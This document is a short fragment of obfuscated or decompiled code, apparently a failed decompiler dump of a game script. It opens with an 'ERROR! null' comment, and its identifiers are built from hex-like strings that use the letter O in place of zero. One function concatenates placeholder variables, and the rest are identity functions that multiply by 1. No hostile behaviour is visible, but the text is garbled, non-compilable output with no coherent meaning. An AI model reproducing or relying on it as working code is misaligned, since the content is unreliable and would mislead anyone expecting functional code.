/* ERROR! null */
 function "OxOOOOOO5C" (number 20)

public OxOOOOO4EC()
{
	return __pl_OxOOOOO48D + __pl_OxOOOOO4E5 + __pl_OxOOOOO4EO + __pl_OxOOOOO4E4 + __pl_OxOOOOO4EF + __pl_OxOOOOO4E5;
}

OxOOOOO4BB(OxOOOOO4B7)
{
	return OxOOOOO4B7 * 1;
}

OxOOOOO4B6(OxOOOOO4BA)
{
	return OxOOOOO4BA * 1;
}

OxOOOOO4B3(OxOOOOO4BD)
{
	return OxOOOOO4BD * 1;
}

OxOOOOO47O(OxOOOOO474)
{
	return OxOOOOO474 * 1;
}

OxOOOOO47F(OxOOOOO475)
{
	return OxOOOOO475 * 1;
}

OxOOOOO471(OxOOOOO47C)
{
	return OxOOOOO47C * 1;
}

OxOOOOO478(OxOOOOO47E)
{
	return OxOOOOO47E * 1;
}

